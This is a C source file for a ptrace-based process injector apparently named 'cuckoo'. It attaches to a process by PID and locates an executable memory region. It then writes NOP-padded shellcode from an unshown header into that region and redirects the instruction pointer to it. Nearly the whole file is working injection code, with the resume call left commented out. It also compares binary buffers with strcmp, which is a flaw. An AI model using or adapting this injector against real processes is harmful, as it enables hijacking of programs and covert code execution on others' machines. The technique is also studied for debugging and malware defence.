#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include "utils.h"
#include "maps.h"
#include "inject.h"
#include "cuckoo.h"
#include "shellcode.h"

#define DATA_ALIGN 8

static process_memory_item *getAttrAddr(process_memory_item *list, char c)
{
    process_memory_item *addr_item = NULL;
    while(list)
    {
        if(strchr(list->permission, c) != NULL) {
            addr_item = list;
            break;
        }
        list = list->next;
    }
    return addr_item;
}

static inline process_memory_item *getWritableAddr(process_memory_item *list)
{
    return getAttrAddr(list, 'w');
}

static inline process_memory_item *getExecutableAddr(process_memory_item *list)
{
    return getAttrAddr(list, 'x');
}


static void getMemAndPrint(pid_t target_pid, unsigned long addr, size_t len)
{
    if(len%sizeof(long) != 0)
    {
        size_t new_len = lengthAlign(len);
        addr = addr + len -new_len;
        len = new_len;
    }
    unsigned char data[len];
    ptraceGetMems(target_pid, addr, data, len);
    for(size_t i=0; i<len; i++)
    {
        printf("0x%x ", data[i]);
    }
    printf("\n");
}

static void setMemAndPrint(pid_t target_pid, unsigned long addr, unsigned char*data, size_t len)
{
    for(size_t i=0; i<len; i++)
    {
        printf("0x%x ", data[i]);
    }
    printf("\n");
    ptraceSetMems(target_pid, addr, data, len);
}


static void cuckoo_main(pid_t target_pid)
{
    ptraceAttach(target_pid);
    
    regs_type old_regs;
    ptraceGetRegs(target_pid, &old_regs);
    printf("0x%llx\n", old_regs.rip);

    regs_type *new_regs = (regs_type *)malloc(sizeof(regs_type));
    if(new_regs == NULL) oops("malloc error ", CUCKOO_SYSTEM_ERROR);
    memcpy(new_regs, &old_regs, sizeof(regs_type));

    process_memory_item *list = mapsParse(target_pid);

    process_memory_item *addr_item = getExecutableAddr(list);
    size_t shellcode_len = SHELLCODE_SIZE;
    unsigned char *new_shellcode = (unsigned char *)malloc(shellcode_len);
    memset(new_shellcode, '\x90', shellcode_len);
    memcpy(new_shellcode, shellcode, sizeof(shellcode));
    unsigned long addr = addr_item->end_addr-shellcode_len;

    setMemAndPrint(target_pid, addr, new_shellcode, shellcode_len);
    unsigned char buffer[shellcode_len];
    ptraceGetMems(target_pid, addr, buffer, shellcode_len);
    assert(!strcmp(buffer, new_shellcode));
    
    
    new_regs->rip = addr;
    printf("[+] Setting RIP to 0x%llx\n\t", new_regs->rip);
    ptraceSetRegs(target_pid, new_regs);
    ptraceGetRegs(target_pid, &old_regs);
    printf("the rip is 0x%llx\n", old_regs.rip);
    // ptraceCont(target_pid);

    ptraceDetach(target_pid);
    destory(list);
    free(new_shellcode);
    free(new_regs);
}

int main(int argc, char *argv[])
{
    if(argc != 2){
        printf("Usage: \n\t%s <pid>\n", argv[0]);
        return 0;
    }
    
    pid_t target_pid = atoi(argv[1]);
    cuckoo_main(target_pid);
    return 0;
}
